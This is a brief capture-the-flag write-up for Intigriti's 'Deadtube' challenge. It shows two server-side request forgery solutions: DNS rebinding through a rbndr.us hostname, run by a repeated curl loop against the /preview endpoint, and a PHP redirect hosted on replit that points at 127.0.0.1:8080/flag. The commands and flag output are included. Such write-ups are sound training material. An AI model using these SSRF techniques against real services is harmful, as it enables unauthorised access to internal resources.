## Intended

```
DNS rebinding to 127.0.0.1 and 35.205.87.74 (<-deadtube.ctf.intigriti.io)
via https://lock.cmpxchg8b.com/rebinder.html
-> 7f000001.23cd574a.rbndr.us

$ for i in {1..10}; do curl 'https://deadtube.ctf.intigriti.io/preview' --data-raw 'link=http://7f000001.23cd574a.rbndr.us:8080/flag';echo ""; done

There was an error previewing your url
1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}
There was an error previewing your url
You are not allowed to view this url
1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}
1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}
You are not allowed to view this url
You are not allowed to view this url
There was an error previewing your url
You are not allowed to view this url
```

## Unintended

```
there's a simpler way to do Deadtube, preview an url that redirects to http://127.0.0.1:8080/flag, I used replit.com host a PHP file with header('Location: http://127.0.0.1:8080/flag');

curl -I https://NutritiousScarceDimension.rsrsrsrsrs.repl.co
HTTP/2 302
content-type: text/html; charset=UTF-8
date: Sun, 13 Mar 2022 10:17:26 GMT
expect-ct: max-age=2592000, report-uri="https://sentry.repl.it/api/10/security/?sentry_key=615192fd532445bfbbbe966cd7131791"
host: NutritiousScarceDimension.rsrsrsrsrs.repl.co
location: http://127.0.0.1:8080/flag
replit-cluster: global
strict-transport-security: max-age=7674093; includeSubDomains
x-powered-by: PHP/7.4.21
```
